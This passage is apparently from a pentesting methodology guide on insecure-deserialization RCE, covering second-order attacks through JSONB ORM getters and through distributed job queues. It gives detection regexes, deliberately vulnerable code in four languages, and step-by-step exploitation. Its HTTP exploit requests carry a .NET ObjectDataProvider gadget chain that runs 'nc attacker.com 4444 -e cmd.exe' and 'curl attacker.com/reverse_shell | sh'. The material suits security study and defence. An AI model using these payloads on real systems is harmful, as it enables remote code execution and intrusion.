{% endtab %}

{% tab title="Java" %}
```regexp
\b(?:@Type\s*\(\s*type\s*=\s*"jsonb"\s*\)|@JdbcTypeCode\s*\(\s*SqlTypes\.JSON\s*\)|@Convert\s*\(|ObjectMapper\s*\.|enableDefaultTyping)
```
{% endtab %}

{% tab title="PHP" %}
```regexp
\b(?:\$casts\s*=\s*\[[^\]]*['"][^'"]+['"]\s*=>\s*['"]array['"]|json_decode\s*\(|unserialize\s*\()
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
\b(?:JSON\.parse\s*\(|sequelize\.JSONB|DataTypes\.JSONB|serialize\.unserialize)
```
{% endtab %}
{% endtabs %}

**RipGrep Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
\[Column\(TypeName\s*=\s*"jsonb"\)\]|TypeNameHandling\s*=\s*TypeNameHandling\.(All|Auto)
```
{% endtab %}

{% tab title="Java" %}
```regexp
@Type\(type\s*=\s*"jsonb"\)|@JdbcTypeCode\(SqlTypes\.JSON\)|enableDefaultTyping
```
{% endtab %}

{% tab title="PHP" %}
```regexp
\$casts\s*=\s*\[.*'array'\]|json_decode\(|unserialize\(
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
sequelize\.JSONB|DataTypes\.JSONB|JSON\.parse\(
```
{% endtab %}
{% endtabs %}

**Vulnerable Code Pattern**

{% tabs %}
{% tab title="C#" %}
```csharp
public class DashboardEntity 
{
    public Guid Id { get; set; }
    
    // [1]
    [Column(TypeName = "jsonb")]
    public string RawConfiguration { get; set; }

    // [2]
    // [3]
    [NotMapped]
    public DashboardConfig Configuration 
    {
        get 
        {
            var settings = new JsonSerializerSettings { TypeNameHandling = TypeNameHandling.Auto };
            // [4]
            return JsonConvert.DeserializeObject<DashboardConfig>(RawConfiguration, settings);
        }
        set 
        {
            var settings = new JsonSerializerSettings { TypeNameHandling = TypeNameHandling.Auto };
            RawConfiguration = JsonConvert.SerializeObject(value, settings);
        }
    }
}

// In the API Controller:
[HttpPost("import")]
public async Task<IActionResult> ImportTemplate([FromBody] JsonElement rawJson) {
    var dashboard = new DashboardEntity { RawConfiguration = rawJson.GetRawText() };
    await _db.Dashboards.AddAsync(dashboard);
    await _db.SaveChangesAsync();
    return Ok();
}
```
{% endtab %}

{% tab title="Java" %}
```java
@Entity
@Table(name = "dashboards")
public class DashboardEntity {

    @Id
    private UUID id;

    // [1]
    @Type(type = "jsonb")
    @Column(columnDefinition = "jsonb")
    private String rawConfiguration;

    // [2]
    // [3]
    @Transient
    public DashboardConfig getConfiguration() throws Exception {
        ObjectMapper mapper = new ObjectMapper();
        mapper.enableDefaultTyping(ObjectMapper.DefaultTyping.NON_FINAL);
        // [4]
        return mapper.readValue(rawConfiguration, DashboardConfig.class);
    }
}

// In the API Controller:
@PostMapping("/import")
public ResponseEntity<?> importTemplate(@RequestBody String rawJson) {
    DashboardEntity dashboard = new DashboardEntity();
    dashboard.setRawConfiguration(rawJson);
    repository.save(dashboard);
    return ResponseEntity.ok().build();
}
```
{% endtab %}

{% tab title="PHP" %}
```php
class DashboardEntity extends Model 
{
    // [1]
    protected $casts = [
        'raw_configuration' => 'array',
    ];

    // [2]
    // [3]
    public function getConfigurationAttribute() 
    {
        // [4]
        // Utilizing a custom mutator that inadvertently calls unserialize 
        // to handle legacy serialized object storage mapped over JSON columns.
        return unserialize($this->attributes['raw_configuration']);
    }
}

// In the API Controller:
public function importTemplate(Request $request) {
    DashboardEntity::create(['raw_configuration' => $request->getContent()]);
    return response('OK');
}
```
{% endtab %}

{% tab title="Node.js" %}
```javascript
const { Model, DataTypes } = require('sequelize');

class DashboardEntity extends Model {
    // [2]
    // [3]
    get configuration() {
        // [4]
        // Using node-serialize library to hydrate functions and objects from the DB
        return serialize.unserialize(this.getDataValue('raw_configuration'));
    }
}

DashboardEntity.init({
    // [1]
    raw_configuration: {
        type: DataTypes.JSONB
    }
}, { sequelize });

// In the API Controller:
router.post('/import', async (req, res) => {
    await DashboardEntity.create({ raw_configuration: JSON.stringify(req.body) });
    res.send('OK');
});
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
\[1] The database schema utilizes a native `JSONB` column to store infinitely flexible, deeply nested UI components, \[2] To apply backend business logic (like restricting specific widgets to certain user roles), the backend must reconstruct the JSON block into strongly typed classes, \[3] The architecture implements an elegant property getter mapping. Whenever the application accesses `entity.Configuration`, it automatically deserializes the raw string on the fly, \[4] The fatal architectural assumption. The getter implicitly relies on aggressive polymorphic deserialization (e.g., `TypeNameHandling.Auto`) to rebuild the diverse hierarchy of UI components. The developer assumes the `JSONB` data is fundamentally secure because it resides within the database. However, the `import` API endpoint bypassed standard Object validation, allowing an attacker to persist a Gadget Chain type-marker directly into the database. The RCE triggers instantly when any victim or automated task attempts to read the record

```http
// 1. Attacker interacts with the Bulk Import endpoint, bypassing the strict DTO checks of the visual builder.
// 2. Attacker submits a seemingly valid dashboard configuration, but injects the polymorphic Gadget marker.
POST /api/v1/dashboards/import HTTP/1.1
Host: builder.enterprise.tld
Authorization: Bearer <low_privilege_token>
Content-Type: application/json

{
  "title": "Malicious Dashboard",
  "components": [
    {
      "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
      "MethodName": "Start",
      "ObjectInstance": {
        "$type": "System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
        "StartInfo": {
          "$type": "System.Diagnostics.ProcessStartInfo, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
          "FileName": "cmd.exe",
          "Arguments": "/c nc attacker.com 4444 -e cmd.exe"
        }
      }
    }
  ]
}

// 3. The Backend receives the JSON, converts it to a raw string, and saves it into the JSONB column.
// 4. An Administrator logs into the portal and navigates to the "All Templates" view.
// 5. The ORM fetches the dashboard list. When mapping the entities, it triggers the `.Configuration` getter.
// 6. The polymorphic deserializer encounters the $type parameter, builds the execution chain, and delivers a reverse shell.
```
{% endstep %}

{% step %}
To persist infinitely customizable User Interface hierarchies, the architecture leveraged relational `JSONB` columns combined with aggressive polymorphic deserialization at the ORM layer. This design successfully eliminated the need for complex database migrations. The security model erroneously assumed that Data-at-Rest is inherently safe, failing to account for secondary ingress vectors like bulk-import APIs that bypass strict object typing and stream raw text directly into the database. The attacker injected a known Deserialization Gadget Chain disguised as a standard UI component payload. The database faithfully stored the poisoned JSON string. The attack executed purely as a Second-Order vulnerability: when a highly privileged user accessed the record, the ORM's automatic hydration pipeline triggered the deserialization sink, instantly compromising the administrative backend environment without requiring the attacker to interact directly with the vulnerable execution endpoint
{% endstep %}
{% endstepper %}

***

#### Remote Code Execution via Asynchronous State Promotion in Distributed Job Queues

{% stepper %}
{% step %}
Map the entire target system using Burp Suite. Focus on asynchronous operations triggered by complex user requests (e.g., `Generate Massive PDF Report`, `Export Custom CRM Data`, `Trigger Batch Webhooks`)
{% endstep %}

{% step %}
Draw the application's architecture and trust boundaries inside XMind
{% endstep %}

{% step %}
Decompile or reverse engineer the application according to the underlying technology stack.
{% endstep %}

{% step %}
Identify a Distributed Job Queue architecture (e.g., Hangfire, Celery, Laravel Horizon, BullMQ). To prevent long-running tasks from timing out the HTTP connection, the web controller accepts the user's request, serializes the method arguments, and pushes them into Redis or a database queue. A separate fleet of background workers continuously polls this queue and executes the jobs
{% endstep %}

{% step %}
Investigate the enqueueing optimization inside the web controller. The endpoint accepts a highly flexible, un-typed dynamic filter object from the frontend SPA (`Dictionary<string, object>` or `Map<String, Object>`)
{% endstep %}

{% step %}
Analyze the web controller's ingress deserializer. The synchronous HTTP endpoint correctly utilizes a _safe_ JSON deserializer (one without polymorphic typing enabled) to parse the user's HTTP request into a generic Dictionary
{% endstep %}

{% step %}
Discover the fatal state promotion optimization. When the web controller enqueues the job (e.g., `BackgroundJob.Enqueue(() => ReportService.Export(filters))`), the Job Queue framework must serialize the `filters` Dictionary and save it to Redis
{% endstep %}

{% step %}
Understand the framework requirement: Because Job Queue frameworks must seamlessly reconstruct complex method signatures and execution states across completely different physical servers, they natively utilize _highly aggressive polymorphic serializers_ (e.g., preserving Type names and Assembly details) when writing data to the queue
{% endstep %}

{% step %}
Recognize the architectural gap: The web controller safely ingests the JSON. If the attacker includes a polymorphic type marker (e.g., `"@class": "java.lang.Runtime"`) inside the JSON, the safe HTTP deserializer simply ignores it or treats it as a harmless string key-value pair within the Dictionary (`key: "@class", value: "java.lang.Runtime"`)
{% endstep %}

{% step %}
Trace the payload execution. The web controller passes this harmless Dictionary to the Job Queue. The Job Queue framework serializes the Dictionary. _Crucially, it preserves the attacker's string key-value pair_
{% endstep %}

{% step %}
Construct a JSON payload targeting the asynchronous export endpoint. Inject the specific polymorphic type marker expected by the _background queue's_ internal serializer, pointing to a Gadget Chain
{% endstep %}

{% step %}
Submit the request. The web API responds with `200 OK - Job Queued`
{% endstep %}

{% step %}
The Job Queue writes the payload to Redis
{% endstep %}

{% step %}
The background worker picks up the job. The framework invokes its aggressive polymorphic deserializer to reconstruct the method arguments
{% endstep %}

{% step %}
The background deserializer encounters the attacker's injected type markers, completely bypasses the generic Dictionary mapping, and instantiates the Gadget Chain, executing arbitrary code directly on the internal background processing cluster

**VSCode Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
\b(?:BackgroundJob\.Enqueue\s*\(.*IDictionary\s*<\s*string\s*,\s*object\s*>|BackgroundJob\.Schedule\s*\(.*IDictionary\s*<\s*string\s*,\s*object\s*>|IBackgroundJobClient\.Enqueue\s*\(|RecurringJob\.AddOrUpdate\s*\()
```
{% endtab %}

{% tab title="Java" %}
```regexp
\b(?:JobClient\.enqueue\s*\(.*Map\s*<\s*String\s*,\s*Object\s*>|enqueue\s*\(.*HashMap\s*<\s*String\s*,\s*Object\s*>|RabbitTemplate\.convertAndSend\s*\(|JmsTemplate\.convertAndSend\s*\()
```
{% endtab %}

{% tab title="PHP" %}
```regexp
\b(?:Queue::push\s*\(.*array\s*\$[A-Za-z_][A-Za-z0-9_]*|dispatch\s*\(.*\[[^\]]*\]|Bus::dispatch\s*\()
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
\b(?:queue\.add\s*\(.*Object\.assign\s*\(\s*\{\s*\}|queue\.add\s*\(.*\{.*\}|bull\.add\s*\(|agenda\.schedule\s*\()
```
{% endtab %}
{% endtabs %}

**RipGrep Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
BackgroundJob\.Enqueue.*IDictionary<string,\s*object>|BackgroundJob\.Schedule|RecurringJob\.AddOrUpdate
```
{% endtab %}

{% tab title="Java" %}
```regexp
JobClient\.enqueue\(.*Map<String,\s*Object>|RabbitTemplate\.convertAndSend|JmsTemplate\.convertAndSend
```
{% endtab %}

{% tab title="PHP" %}
```regexp
Queue::push\(.*array\s*\$|dispatch\(.*\[
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
queue\.add\(.*Object\.assign\(\{\}\)|bull\.add\(|agenda\.schedule
```
{% endtab %}
{% endtabs %}

**Vulnerable Code Pattern**

{% tabs %}
{% tab title="C#" %}
```csharp
[HttpPost("/api/v1/reports/export")]
public IActionResult TriggerExport([FromBody] Dictionary<string, object> filterCriteria)
{
    // [1]
    // The default ASP.NET Core JSON parser safely parses the payload into a Dictionary.
    // Polymorphism is disabled at the HTTP edge.

    // [2]
    // [3]
    // [4]
    // Hangfire framework intrinsically uses TypeNameHandling.All under the hood 
    // to serialize the method arguments to the SQL/Redis backend.
    var jobId = BackgroundJob.Enqueue<IReportGenerator>(x => x.GenerateAsync(filterCriteria));

    return Ok(new { JobId = jobId });
}

// In the Background Worker (IReportGenerator):
public async Task GenerateAsync(Dictionary<string, object> filters) { ... }
```
{% endtab %}

{% tab title="Java" %}
```java
@PostMapping("/api/v1/reports/export")
public ResponseEntity<?> triggerExport(@RequestBody Map<String, Object> filterCriteria) {
    // [1]
    // Standard Jackson ObjectMapper safely creates a generic Map.
    
    // [2]
    // [3]
    // [4]
    // The JobQueue framework (e.g., Quartz or a custom Redis queue) uses a heavily 
    // polymorphic serializer (ObjectInputStream or Jackson with DefaultTyping) to persist arguments.
    jobQueue.enqueue("ReportWorker", "generate", filterCriteria);

    return ResponseEntity.ok().build();
}

// In the Background Worker:
public void generate(Map<String, Object> filters) { ... }
```
{% endtab %}

{% tab title="PHP" %}
```php
public function triggerExport(Request $request)
{
    // [1]
    $filterCriteria = $request->json()->all();

    // [2]
    // [3]
    // [4]
    // Laravel Queues automatically serialize the entire Job payload, including arrays, 
    // using the native `serialize()` function for database/Redis storage.
    ReportGeneratorJob::dispatch($filterCriteria);

    return response()->json(['status' => 'Queued']);
}
```
{% endtab %}

{% tab title="Node.js" %}
```javascript
router.post('/api/v1/reports/export', async (req, res) => {
    // [1]
    let filterCriteria = req.body; // Safely parsed by Express body-parser

    // [2]
    // [3]
    // [4]
    // BullMQ or similar queues serialize to JSON, but if a custom class-transformer 
    // or node-serialize is used in the worker to rehydrate classes...
    await reportQueue.add('generate', { filters: filterCriteria });

    res.send({ status: 'Queued' });
});
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
\[1] The API securely ingests the user request. By mapping the payload to an untyped Dictionary/Map, the edge framework natively defends against Deserialization vulnerabilities because it refuses to cast JSON to arbitrary objects, \[2] The controller offloads the heavy processing logic to a background job queue, passing the unsanitized Dictionary directly as a method argument, \[3] To support distributed execution, the Job Queue framework must capture the exact execution state. Because frameworks cannot predict user method signatures, their internal serializers are aggressively configured to record full Type metadata (e.g., `$type` in JSON.NET), \[4] The fatal state promotion. The attacker's injected Gadget payload safely rested within the Dictionary at the API edge. However, when the Job Queue serialized the Dictionary to Redis, it embedded the attacker's Type markers into its own persistent state. When the background worker retrieved the job and applied its aggressive polymorphic deserializer to reconstruct the method arguments, it honored the attacker's Type metadata, bypassing the Dictionary entirely and instantiating the Remote Code Execution gadget

```http
// 1. Attacker targets an asynchronous data export endpoint.
// 2. The endpoint expects a flat dictionary of filters. The attacker injects a known Gadget Chain.
// The safe API Edge parser simply sees a key named "$type" and stores it as a string.

POST /api/v1/reports/export HTTP/1.1
Host: api.enterprise.tld
Authorization: Bearer <user_token>
Content-Type: application/json

{
  "Department": "Finance",
  "StartDate": "2026-01-01",
  "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
  "MethodName": "Start",
  "ObjectInstance": {
    "$type": "System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
    "StartInfo": {
      "$type": "System.Diagnostics.ProcessStartInfo, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
      "FileName": "cmd.exe",
      "Arguments": "/c curl attacker.com/reverse_shell | sh"
    }
  }
}

// 3. The API Edge returns 200 OK and enqueues the job.
// 4. The Hangfire/Celery background worker pulls the job from Redis.
// 5. The framework's aggressive deserializer processes the payload, honors the $type marker, 
// and triggers RCE on the background cluster.
```
{% endstep %}

{% step %}
To protect the synchronous API layer from memory exhaustion and deserialization attacks, the edge endpoints were configured to parse incoming JSON exclusively into safe, untyped generic Dictionaries. To manage long-running tasks, the platform leveraged a distributed Job Queue framework. The architectural flaw materialized during state transition. Background queue frameworks must aggressively utilize polymorphic serialization to accurately persist and reconstruct method arguments across process boundaries. When the web controller blindly passed the user-controlled Dictionary into the queue, it inadvertently promoted the payload's state. The harmless dictionary keys (e.g., `$type` or `@class`) were absorbed into the framework's native persistence envelope. Upon dequeuing the task, the background worker's aggressive deserializer recognized the injected type markers as authoritative class definitions, overriding the generic dictionary structure and instantiating the injected system gadgets to achieve full Remote Code Execution
{% endstep %}
{% endstepper %}

***

## Cheat Sheet
